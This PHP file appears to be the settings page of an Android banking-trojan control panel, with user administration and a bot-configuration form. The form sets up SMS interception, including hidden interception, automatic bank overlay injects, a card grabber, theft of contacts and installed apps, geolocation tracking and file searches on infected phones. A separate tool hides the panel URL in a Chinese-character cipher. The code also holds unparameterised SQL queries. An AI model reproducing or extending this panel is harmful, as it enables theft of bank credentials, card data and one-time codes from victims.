<?php
if (!(isset($_SESSION['panel_user'])))
{
	session_destroy();
	header("Location: /login.php");
}else{

	if ($_SESSION['panel_status']!="Action"){
		session_destroy();
		header("Location: /login.php");
	}

	if ($_SESSION['panel_right']!="admin"){
		header("Location: /index.php");
	}
}
?>

<div class="content">

<center>
<input type='submit' value='Users' onClick="location.href='index.php?cont=settings&page=users'" style='width:140px; margin-left:30px;margin-top:10px;' class='btn btn-outline-secondary'/>
<input type='submit' value='Bots settings'onClick="location.href='index.php?cont=settings&page=bots-settings'" style='width:140px; margin-left:30px;margin-top:10px;' class='btn btn-outline-secondary'/>
<input type='submit' value='Generate an Encrypted URL'onClick="location.href='index.php?cont=settings&page=Twitter'" style='width:230px; margin-left:30px;margin-top:10px;' class='btn btn-outline-secondary'/>

</center>




<script>
function reqProc()
{
	if (document.getElementById("requestProc").checked) {
		document.getElementById("textIDrequestProc").disabled = false;
	}else {
		document.getElementById("textIDrequestProc").value='';
		document.getElementById("textIDrequestProc").disabled = true;
	}
}

function reqGEO()
{
	if (document.getElementById("request_geo").checked) {
		document.getElementById("textIDRequest_geo").disabled = false;
	}else {
		document.getElementById("textIDRequest_geo").value='';
		document.getElementById("textIDRequest_geo").disabled = true;
	}
}

function addinjauto()
{
	if (document.getElementById("checkaddinjauto").checked) {
		document.getElementById("textIDaddinjauto").disabled = false;
	}else {
		document.getElementById("textIDaddinjauto").value='';
		document.getElementById("textIDaddinjauto").disabled = true;
	}
}

function addInjNoAuto()
{
	if (document.getElementById("IDaddInjNoAuto").checked) {
		document.getElementById("TextIDaddInjNoAuto").disabled = false;
	}else {
		document.getElementById("TextIDaddInjNoAuto").value='';
		document.getElementById("TextIDaddInjNoAuto").disabled = true;
	}
}
function GetPhoneContacts()
{
	if (document.getElementById("checkGetPhoneContacts").checked) {
		document.getElementById("TextIDcheckGetPhoneContacts").disabled = false;
	}else {
		document.getElementById("TextIDcheckGetPhoneContacts").value='';
		document.getElementById("TextIDcheckGetPhoneContacts").disabled = true;
	}
}

function Getgeolocation()
{
	if (document.getElementById("checkGetgeolocation").checked) {
		document.getElementById("TextIDcheckGetgeolocation").disabled = false;
	}else {
		document.getElementById("TextIDcheckGetgeolocation").value='';
		document.getElementById("TextIDcheckGetgeolocation").disabled = true;
	}
}
</script>

<?php

if ($_SESSION['panel_right']=="admin"){
if(isset($_POST["ADDUSER"]))//вызываем модальную форму!
{
	echo "<script>";
		echo "$(document).ready(function(){";
			echo "$('#adduser_modal').css({'display':'block'});";
		echo "});";
	echo "</script>";
}

if (preg_match("/edit/",print_r($_POST,true))){
	$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
	$connection->exec('SET NAMES utf8');

	$str = print_r($_POST,true);
	$str = str_replace("[","@@@",$str);
	$str = str_replace("]","@@@",$str);
	$massiv = explode("@@@", $str);
	 $editid;
	$editid = str_replace("edit","", $massiv[1]);



	echo "<script>";
		echo "$(document).ready(function(){";
			echo "$('#edituser_modal').css({'display':'block'});";
		echo "});";
	echo "</script>";

}

if (preg_match("/delete/",print_r($_POST,true))){
	$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
	$connection->exec('SET NAMES utf8');

	$str = print_r($_POST,true);
	$str = str_replace("[","@@@",$str);
	$str = str_replace("]","@@@",$str);
	$massiv = explode("@@@", $str);
	$str = str_replace("delete","", $massiv[1]);


	$sql = "DELETE FROM t_users WHERE id='$str'";
	$connection->query($sql);
}
if (preg_match("/disable/",print_r($_POST,true))){
	$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
	$connection->exec('SET NAMES utf8');

	$str = print_r($_POST,true);
	$str = str_replace("[","@@@",$str);
	$str = str_replace("]","@@@",$str);
	$massiv = explode("@@@", $str);
	$str = str_replace("disable","", $massiv[1]);

	$sql = "UPDATE t_users SET status = 'Disabled' WHERE id = '$str';";
	$connection->query($sql);

}

if (preg_match("/enable/",print_r($_POST,true))){
	$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
	$connection->exec('SET NAMES utf8');

	$str = print_r($_POST,true);
	$str = str_replace("[","@@@",$str);
	$str = str_replace("]","@@@",$str);
	$massiv = explode("@@@", $str);
	$str = str_replace("enable","",$massiv[1]);

	$sql = "UPDATE t_users SET status = 'Action' WHERE id = '$str';";
	$connection->query($sql);

}
if (preg_match("/connect/",print_r($_POST,true))){
	$str = print_r($_POST,true);
	$str = str_replace("[","@@@",$str);
	$str = str_replace("]","@@@",$str);
	$massiv = explode("@@@", $str);
	$url = str_replace("connect","",isset($massiv[1]) ? $massiv[1] : "");
	$Param = getURL_SERVER();
	$url=str_replace("_",".",$url);
	$md5=md5($url);
	$getData = SendHTTP("$url/setURL.php","$md5|$Param|");
}

$page = $_GET['page'];

	if($page == "bots-settings"){
		getBotsSETTINGS();
	}
	elseif($page == "users"){
		getUSERS();
	}
	elseif($page == "Twitter"){
		getTwitter();
	}
	else{
		getBotsSETTINGS();
	}

	}
?>


<?php

function getTwitter(){
include '././crypt.php';
echo "<form name='twitter' method='post'>
<Center>
<div id='DIV_TWITTER' style='width:75%; min-height: 150px; margin-top:20px;	border: 1px solid black; border-color: #43717a;	background: #1D1F24; border-radius: 4px;' >
Encrypt url for the admin panel
</br></br>
<input type='text' name='adminkaurl' value='' id='adminkaurl' style='margin-left:5%; color: #337ab7; background: #1D1F24; width: 75%; font-size: 13; height: 28px; border-radius: 5px;'></input>

<input type='submit' value='Generate' name='btntwitter' class='btn btn-outline-secondary'/>";


if(isset($_POST["btntwitter"])){
			$textTwit = isset($_POST['adminkaurl']) ? $_POST['adminkaurl'] : "";
			echo "</br></br>";
			$enstr = encrypt($textTwit,cryptKey);


		/*	$arrayText = str_split($full, 1);
			$fullText="";
			for($i=0;$i<count($arrayText);$i++){
			   $randInt = rand(0, 6);
			   $space = "";
			   if($randInt!=0){
			      for($j=0;$j<$randInt;$j++){
			      	$space="$space ";
			      }
			   }
			   $fullText="$fullText$space".$arrayText[$i];
			}*/



			$arrayCH = array(
    	                "Q" => "需",
    	                "W" => "要",
			"E" => "意",
			"R" => "在",
			"T" => "中",
			"Y" => "并",
			"U" => "没",
			"I" => "有",
			"O" => "个",
			"P" => "概",
			"A" => "念",
			"S" => "小",
			"D" => "语",
			"F" => "拼",
			"G" => "亡",
			"H" => "及",
			"J" => "注",
			"K" => "鲜",
			"L" => "新",
			"Z" => "死",
			"X" => "之",
			"C" => "类",
			"V" => "阿",
			"B" => "努",
			"N" => "比",
			"M" => "拉",
			"q" => "丁",
			"w" => "化",
			"e" => "体",
			"r" => "系",
			"y" => "都",
			"u" => "只",
			"i" => "斯",
			"o" => "一",
			"p" => "套",
			"a" => "用",
			"s" => "恶",
			"d" => "件",
			"f" => "来",
			"g" => "标",
			"h" => "音",
			"j" => "的",
			"k" => "符",
			"l" => "号",
			"z" => "而",
			"x" => "不",
			"c" => "是",
			"v" => "字",
			"b" => "母",
			"n" => "寂",
			"m" => "寞",
			"=" => "肏",
			"0" => "你",
			"1" => "妈",
			"2" => "屄",
			"3" => "引",
			"4" => "脚",
			"5" => "吸",
			"6" => "员",
			"7" => "会",
			"8" => "膏",
			"9" => "药");

			foreach ($arrayCH as $key => $value) {
				$enstr = str_replace($key,$value,$enstr);
			}
	//		苏尔的开始  - начало
	//    苏尔苏尔完  - конец
     $full = "苏尔的开始".$enstr."苏尔苏尔完";



			echo "<pre style=' min-height: 30px;width:85%;color:#fff; border-color: #43717a;	background: #1D1F24;'>$full</pre>";
		}

echo "
</div>
</Center>
</form>
";




}




function getUSERS()
{

$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
$connection->exec('SET NAMES utf8');
$sql = "SELECT * FROM t_users";


echo "<form name='getUSERS' method='post'>
<center>
	<div id='DIV_USERS' style='width:75%; min-height: 300px; margin-top:20px;	border: 1px solid black; border-color: #43717a;	background: #1D1F24; border-radius: 4px;' >
		USERS";
echo "</br>";

echo "<input type='submit' value='Add User' name='ADDUSER' style='width:100px; margin-left:-83%;' class='btn btn-outline-success  '/>";

echo "<table class='table table-hover table_dark' id='bootstrap-table'>
    <thead class='header_table_bots'>

		<th>Login</th>
		<th>Permission</th>
		<th>Tag bots</th>
		<th>Status</th>
		<th>Actions</th>
	</thead>";

	foreach($connection->query($sql) as $row)
		{
			$id = $row['id'];
			$login = $row['login'];
			$right = $row['right_'];
			$status = $row['status'];
			$tag = $row['tag'];

		if(($tag=="")||($tag==" "))
		{
			$tag = "";
		}

		if($status != "Disabled")
		{
			$btn_act = "<input type='submit' value='DISABLED' name='disable$id' style='width:105px;' class='btn btn-outline-warning '/>";
		}
		else
		{
			$btn_act = "<input type='submit' value='ENABLE' name='enable$id' style='width:90px;' class='btn btn-outline-primary '/>";
		}

		echo "<tr class='table_bots' style='color: #A4A4A4;'>
		<td>$login </td>
		<td>$right</td>
		<td>$tag</td>
		<td>$status</td>
		<td>
		$btn_act
		<input type='submit' value='EDIT' name='edit$id' class='btn btn-outline-primary'/>
		<input type='submit' value='DELETE' name='delete$id'  class='btn btn-outline-danger'/>
		</td>
		</tr>";
		}
	echo "</table>";
	echo "</div>
	</center>
	</form>";
}

function getBotsSETTINGS()
{

	$connection3 = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
	$connection3->exec('SET NAMES utf8');
	$sql3 = "SELECT * FROM settingsall";

	$checkInjectionsApps =  "";
	$secondInjectionsApps = "";
	$checkRequestGeolocation =  "";
	$secondRequestGeolocation = "";
	$checkGrab_auto =  "";
	$Grab_auto =  "";
	$secondGrab_auto =  "";
	$checkInjGrab =  "";
	$InjGrab = "";
	$secondInjGrab =  "";
	$checkPhoneContacts =  "";
	$secondPhoneContacts =  "";
	$checkStartGeolocation =  "";
	$secondStartGeolocation = "";
	$findfiles = "";
	foreach($connection3->query($sql3) as $row)
	{
		if($row['id']=="1")
		{
			$adminkaurl = $row['urls'];

			$injurl = $row['urlInj'];

			$intInterval = $row['intInterval'];
			if($intInterval=="") $intInterval = "14000";

			$checksms = $row['checksms'];

			$checkhidesms = $row['checkhidesms'];

			$checkgeolocation = $row['checkgeolocation'];

			$checkInjectionsApps = $row['checkInjectionsApps'];
			$secondInjectionsApps = $row['secondInjectionsApps'];

			$checkRequestGeolocation = $row['checkRequestGeolocation'];
			$secondRequestGeolocation = $row['secondRequestGeolocation'];

			$checkGrab_auto = $row['checkGrab_auto'];
			$secondGrab_auto = $row['secondGrab_auto'];

			$checkInjGrab = $row['checkInjGrab'];
			$secondInjGrab = $row['secondInjGrab'];

			$checkPhoneContacts = $row['checkPhoneContacts'];
			$secondPhoneContacts = $row['secondPhoneContacts'];

			$checkStartGeolocation = $row['checkStartGeolocation'];
			$secondStartGeolocation = $row['secondStartGeolocation'];

			$findfiles = $row['findfiles'];
			break;
		}
	}


	echo "<form name='getBotsSETTINGS' method='post' action='application/set/editSettingsPanel.php'>
		<div id='Bots_settings' style='width:34%; min-height: 300px; margin-top:20px; margin-left:36%;	border: 1px solid black; border-color: #43717a;	background: #1D1F24; border-radius: 4px;' >
			<center>Bots SETTINGS</center>
			</br></br>

			<a style='margin-left:5%; color:#fff'>URLs panel(url1,url2,..)</a>
			<input type='text' name='adminkaurl' value='$adminkaurl' id='adminkaurl' style='margin-left:5%; color: #337ab7; background: #1D1F24; width: 75%; font-size: 13; height: 28px; border-radius: 5px;'></input>

			</br></br>

			<a style='margin-left:5%; color:#fff'>URL injections</a>
			<input type='text' name='injurl' value='$injurl' id='injurl' style='margin-left:5%; color: #337ab7; background: #1D1F24; width: 75%; font-size: 13; height: 28px; border-radius: 5px;'></input>

			</br></br>


			<a style='margin-left:5%; color:#fff'>Bots request interval(Milliseconds)</a>
			<input type='text' name='intInterval' value='$intInterval' id='intInterval' style='margin-left:5%; color: #337ab7; background: #1D1F24; width: 75%; font-size: 13; height: 28px; border-radius: 5px;'></input>

			</br></br>

			<a style='margin-left:5%; color:#fff'>Find the raw file(.doc/.txt/.apk)</a>
			<input type='text' name='findfiles' value='$findfiles' id='intInterval' style='margin-left:5%; color: #337ab7; background: #1D1F24; width: 75%; font-size: 13; height: 28px; border-radius: 5px;'></input>

			</br></br>";



			if($checksms=="1"){
				echo "<input type='checkbox'   value='1' checked='checked' name='checksms' id='checksms' style='margin-left:5%'   />";
			}else{
				echo "<input type='checkbox'   value='1' name='checksms' id='checksms' style='margin-left:5%'   />";
			}
			echo "<a style='margin-left:1%; color:#fff'>Interception SMS</a>
			</br></br>";


			if($checkhidesms=="1"){
				echo "<input type='checkbox'   value='1' checked='checked' name='checkhidesms' id='checkhidesms' style='margin-left:5%'   />";
			}else{
				echo "<input type='checkbox'   value='1' name='checkhidesms' id='checkhidesms' style='margin-left:5%'   />";
			}
			echo "<a style='margin-left:1%; color:#fff'>Hidden SMS interception</a>
			</br></br>";

			if($checkgeolocation=="1"){
				echo "<input type='checkbox'   value='1' checked='checked' name='checkgeolocation' id='checkgeolocation' style='margin-left:5%'   />";
			}else{
				echo "<input type='checkbox'   value='1' name='checkgeolocation' id='checkgeolocation' style='margin-left:5%'   />";
			}
			echo "<a style='margin-left:1%; color:#fff'>Start geolocation </a>
			</br></br>

			<a style='margin-left:5%; color:#fff'>On timer:</a></br></br>";

			if($checkInjectionsApps=="1"){
				echo "<input type='checkbox' onclick='reqProc();' value='1' checked='checked' name='checkInjectionsApps' id='requestProc' style='margin-left:5%' />";
			}else{
				echo "<input type='checkbox' onclick='reqProc();' value='1' name='checkInjectionsApps' id='requestProc' style='margin-left:5%' />";
				$secondInjectionsApps="";
			}

			echo "
			<a style='color:#fff;' >Request permission for injection</a></br>
			<input type='text' name='secondInjectionsApps' value='$secondInjectionsApps' id='textIDrequestProc' style='margin-left:5%; color: #337ab7; background: #1D1F24; width: 75%; font-size: 13; height: 28px; border-radius: 5px;'></input>
			<a style='color:#fff'>seconds</a>
			</br></br>";


			if($checkRequestGeolocation=="1"){
				echo "<input type='checkbox'  onclick='reqGEO();' value='1' checked='checked' name='checkRequestGeolocation' id='request_geo' style='margin-left:5%'   />";
			}else{
				echo "<input type='checkbox'  onclick='reqGEO();' value='1' name='checkRequestGeolocation' id='request_geo' style='margin-left:5%'   />";
				$secondRequestGeolocation="";
			}

			echo "
			<a style='color:#fff;' >Request permission for geolocation</a>
			<input type='text' name='secondRequestGeolocation' id='textIDRequest_geo' value='$secondRequestGeolocation' style='margin-left:5%; color: #337ab7; background: #1D1F24; width: 75%; font-size: 13; height: 28px; border-radius: 5px;'></input>
			<a style='color:#fff'>seconds</a>

			</br></br>";

			if($checkGrab_auto=="1"){
				echo "<input type='checkbox' onclick='addinjauto();' checked='checked' name='checkGrab_auto' value='1' id='checkaddinjauto'  style='margin-left:5%' />";
			}else{
				echo "<input type='checkbox' onclick='addinjauto();' name='checkGrab_auto' value='1' id='checkaddinjauto'  style='margin-left:5%' />";
				$secondGrab_auto="";
			}

			echo "
			<a style='color:#fff;' >Auto Injects Banks</a>
			<input type='text' name='secondGrab_auto' value='$secondGrab_auto' id='textIDaddinjauto' style='margin-left:5%; color: #337ab7; background: #1D1F24; width: 75%; font-size: 13; height: 28px; border-radius: 5px;'></input>
			<a style='color:#fff'>seconds</a>
			";
			//-----------------------Авто инжект-------------------------
			$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
			$connection->exec('SET NAMES utf8');
			$sql = "SELECT * FROM injection";
			$sql2 = "SELECT * FROM settingsall";


		echo "
			</br>";

			if($checkInjGrab=="1"){
				echo "<input type='checkbox' onclick='addInjNoAuto();' checked='checked' value='1' name='checkInjGrab' id='IDaddInjNoAuto' style='margin-left:5%' onclick='checkAll('chk');' />";
			}else{
				echo "<input type='checkbox' onclick='addInjNoAuto();' value='1' name='checkInjGrab' id='IDaddInjNoAuto' style='margin-left:5%' onclick='checkAll('chk');' />";
				$secondInjGrab="";
			}

			echo "
			<a style='color:#fff;' >Select Injections + Grabber Cards</a></br>
			<input type='text' name='secondInjGrab' value='$secondInjGrab' id='TextIDaddInjNoAuto' style='margin-left:5%; color: #337ab7; background: #1D1F24; width: 75%; font-size: 13; height: 28px; border-radius: 5px;'></input>
			<a style='color:#fff'>seconds</a>";



			//-----------------------Выбранные инжекты--+--Граббер карт-------------------------
			$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
			$connection->exec('SET NAMES utf8');
			$sql = "SELECT * FROM injection";
			$sql2 = "SELECT * FROM settingsall";

			foreach($connection->query($sql2) as $row)
			{
				$id=$row['id'];
				if($id=="1")
				{
					$InjGrab = $row['checkInjGrab'];
					$InjGrab = $row['InjGrab'];
					$secondInjGrab = $row['secondInjGrab'];
					break;
				}

			}
			$inject_s = explode("|", $InjGrab);

			echo "<div style='width:75%; margin-top:5px; margin-left:5%; height:150px; background: #1D1F24;; border: 1px solid #C1C1C1; overflow: auto;'>";
			$idcheck=0;
			foreach($connection->query($sql) as $row)
			{
				$ID_inj = $row['id'];
				$name_inj = $row['name'];

					$bool_inj=false;
					foreach($inject_s as $ids)
					{
						$bool_inj=false;
						if($ids == $ID_inj)
						{
							echo "<input type=checkbox name=check2_set[] value=$ID_inj value='1' id='checkTextIDaddInjNoAuto$idcheck' style='margin-top: -10px;' checked='checked'><a style='color:#337ab7'>$name_inj</a></input></br>";
							$idcheck++;
							break;
						}
						else
						{
							$bool_inj = true;
						}
					}
					if($bool_inj == true)
					{
						echo "<input type=checkbox name=check2_set[] value=$ID_inj id='checkTextIDaddInjNoAuto$idcheck' value='1' style='margin-top: -10px;'><a style='color:#337ab7'>$name_inj</a></input></br>";
						$idcheck++;
					}
			}
			echo "</div></br>";


			if($checkPhoneContacts=="1"){
				echo "<input type='checkbox' onclick='GetPhoneContacts();' checked='checked' name='checkPhoneContacts' value='1' id='checkGetPhoneContacts' style='margin-left:5%'  />";
			}else{
				echo "<input type='checkbox' onclick='GetPhoneContacts();' name='checkPhoneContacts' value='1' id='checkGetPhoneContacts' style='margin-left:5%'  />";
				$secondPhoneContacts="";
			}

			echo "
			<a style='color:#fff;' >Get phone contacts/all applications</a></br>
			<input type='text' name='secondPhoneContacts' value='$secondPhoneContacts' id='TextIDcheckGetPhoneContacts' style='margin-left:5%; color: #337ab7; background: #1D1F24; width: 75%; font-size: 13; height: 28px; border-radius: 5px;'></input>
			<a style='color:#fff'>seconds</a>

			</br></br>";

			if($checkStartGeolocation == "1"){
				echo "<input type='checkbox' onclick='Getgeolocation();' checked='checked' name='checkStartGeolocation' value='1' id='checkGetgeolocation' style='margin-left:5%' />";
			}else{
				echo "<input type='checkbox' onclick='Getgeolocation();' name='checkStartGeolocation' value='1' id='checkGetgeolocation' style='margin-left:5%' />";
				$secondStartGeolocation="";
			}

			echo "
			<a style='color:#fff;' >Start geolocation</a></br>
			<input type='text' name='secondStartGeolocation' value='$secondStartGeolocation' id='TextIDcheckGetgeolocation' style='margin-left:5%; color: #337ab7; background: #1D1F24; width: 75%; font-size: 13; height: 28px; border-radius: 5px;'></input>
			<a style='color:#fff'>seconds</a>

			</br></br>

			<center>
			<input type='submit' value='SAVE SETTINGS' id='SAVESETTINGS' name='SAVESETTINGS'   class='btn btn-outline-success' style='Width:40%; Height: 30px; font-size: 14; margin-top:20px;'/>
			</center>
			</br>
		</div>";
}


//*****
function CheckURL($url){
	if($url=check_url($url))
	{
	  if ($o=open_url($url))
	  {
		return true;
	  }
	  else
	  {
		return false;
	  }
	}
	else return false;
}
function check_url($url)
{
  if(preg_match("@^http://@i",$url)) $url = preg_replace("@(http://)+@i",'http://',$url);
  else if (preg_match("@^https://@i",$url)) $url = preg_replace("@(https://)+@i",'https://',$url);
  else $url = 'http://'.$url;


  if (filter_var($url, FILTER_VALIDATE_URL) === FALSE) {
    return false;
	}
	else return $url;
}
 // Существование ссылки (URL)
function open_url($url)
{
 $url_c=parse_url($url);

  if (!empty($url_c['host']) and checkdnsrr($url_c['host']))
  {
    // Ответ сервера
    if ($otvet=@get_headers($url)){
      return substr($otvet[0], 9, 3);
    }
  }
  return false;
}

function SendHTTP($URL,$request){
	//if(CheckURL("$URL")){
		if(($request!=null)&&(strlen($request)!=0)){
			$params = array('p' => $request);
			$result = file_get_contents("$URL", false, stream_context_create(array(
				'http' => array(
					'method'  => 'POST',
					'header'  => 'Content-type: application/x-www-form-urlencoded',
					'content' => http_build_query($params)
				)
			)));
		}
		return "$result";
	/*}else{
		return "noconnect|";*/
	//}
}
//*****
function getURL_SERVER(){
	$protocol=empty($_SERVER['HTTPS'])?'http://':'https://';
	$SERVER_NAME = $_SERVER['SERVER_NAME'];
	return "$protocol$SERVER_NAME";
}
//*****
?>



<?php//--ADD USERS"--------?>
<div id = "adduser_modal" style="padding-top:70px;">
	<div id = "modal_s" style="Width:280px; Height: 340px; background: #1D1F24;	margin: 100px auto 0 auto;	padding: 10px;	border-radius: 5px;">
	<a id="exit" href="index.php?cont=settings&page=users"  style="margin-left:97%; cursor: pointer; color: Red;" onclick="document.getElementById('log_modal').style.display = 'none'";>X</a>
		<form name="modal_set"  method="POST" action="application/set/addUsers.php">
		<div class="styled-select">

			<a style='color:#fff'>LOGIN</a><input type="text" name="login" id="styled-select" style="color: #337ab7; background: #1D1F24; width: 100%; font-size: 13; height: 28px;"></input>
			</br></br>
			<a style='color:#fff'>PASSWORD</a><input type="text" name="password" id="styled-select" style="color: #337ab7; background: #1D1F24; width: 100%; font-size: 13; height: 28px;"></input>
			</br></br>

			<a style='color:#fff'>RIGHT</a>
			<select  name="RIGHT" style='color: #337ab7; background: #1D1F24; width: 100%; font-size: 13; height: 28px;'>
				<option value='user'>User
				<option value='traffic'>Traffic
				<option value='admin'>Admin
			</select>
			</br></br>
			<a style='color:#fff'>PRIVATE TAG (tag1,tag2,..)</a><input type='text' name='tag' id='styled-select' style='color: #337ab7; background: #1D1F24; width: 100%; font-size: 13; height: 28px;'></input>

			<center>
			<input type='submit' value='ADD USER' id="ADDUSER" name='ADDUSER'   class='btn btn-success' style='Width:100%; Height: 30px; font-size: 14; margin-top:20px;'/>
			</center>
		</div>
		</form>
	</div>
</div>

<?php//--EDIT USERS"--------?>
<div id = "edituser_modal" style="padding-top:70px;">
	<div id = "modal_s" style="Width:280px; Height: 340px; background: #1D1F24;	margin: 100px auto 0 auto;	padding: 10px;	border-radius: 5px;">
	<a id="exit" href="index.php?cont=settings&page=users"  style="margin-left:97%; cursor: pointer; color: Red;" onclick="document.getElementById('log_modal').style.display = 'none'";>X</a>
		<form name="modal_set"  method="POST" action="application/set/editUsers.php">
		<div class="styled-select">

			<?php


			$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
			$connection->exec('SET NAMES utf8');
			$sql = "SELECT * FROM t_users";

			$login = "";
			$password = "";
			$right = "";
			$tag = "";

			$editid = isset($editid) ? $editid : '';  // 0?

			foreach($connection->query($sql) as $row)
			{
				if($editid==$row['id'])
				{
				$login = $row['login'];
				$password = $row['password'];
				$tag=$row['tag'];
				break;
				}
			}

			echo "
			<a style='color:#fff'>LOGIN</a><input type='text' value='$login'  name='login' id='styled-select' style='color: #337ab7; background: #1D1F24; width: 100%; font-size: 13; height: 28px;'></input>
			</br></br>
			<a style='color:#fff'>PASSWORD</a><input type='text' value='' name='password' id='styled-select' style='color: #337ab7; background: #1D1F24; width: 100%; font-size: 13; height: 28px;'></input>
			</br></br>

			<a style='color:#fff'>RIGHT</a>
			<select  name='RIGHT' style='color: #337ab7; background: #1D1F24; width: 100%; font-size: 13; height: 28px;'>
				<option value='user'>User
				<option value='traffic'>Traffic
				<option value='admin'>Admin
			</select>
			</br></br>
			<a style='color:#fff'>PRIVATE TAG (tag1,tag2,..)</a><input type='text' value='$tag' name='tag' id='styled-select' style='color: #337ab7; background: #1D1F24; width: 100%; font-size: 13; height: 28px;'></input>
			";?>


			<center>
			<input type='submit' value='EDIT USER' id="EDITUSER" name='EDITUSER'   class='btn btn-outline-success' style='Width:100%; Height: 30px; font-size: 14; margin-top:20px;'/>
			</center>
			<?php echo "<input type='text' value=$editid name='getID' style='visibility:hidden'/>";?>
		</div>

		</form>
	</div>
</div>

<script>
if (document.getElementById("requestProc").checked) {
	document.getElementById("textIDrequestProc").disabled = false;
}else {
	document.getElementById("textIDrequestProc").value='';
	document.getElementById("textIDrequestProc").disabled = true;
}
if (document.getElementById("request_geo").checked) {
	document.getElementById("textIDRequest_geo").disabled = false;
}else {
	document.getElementById("textIDRequest_geo").value='';
	document.getElementById("textIDRequest_geo").disabled = true;
}

if (document.getElementById("checkGetPhoneContacts").checked) {
	document.getElementById("TextIDcheckGetPhoneContacts").disabled = false;
}else {
	document.getElementById("TextIDcheckGetPhoneContacts").value='';
	document.getElementById("TextIDcheckGetPhoneContacts").disabled = true;
}

if (document.getElementById("checkGetgeolocation").checked) {
	document.getElementById("TextIDcheckGetgeolocation").disabled = false;
}else {
	document.getElementById("TextIDcheckGetgeolocation").value='';
	document.getElementById("TextIDcheckGetgeolocation").disabled = true;
}



if (document.getElementById("IDaddInjNoAuto").checked) {
	document.getElementById("TextIDaddInjNoAuto").disabled = false;

}else {
	document.getElementById("TextIDaddInjNoAuto").value='';
	document.getElementById("TextIDaddInjNoAuto").disabled = true;


}

if (document.getElementById("checkaddinjauto").checked) {
	document.getElementById("textIDaddinjauto").disabled = false;

}else {
	document.getElementById("textIDaddinjauto").value='';
	document.getElementById("textIDaddinjauto").disabled = true;

}
</script>
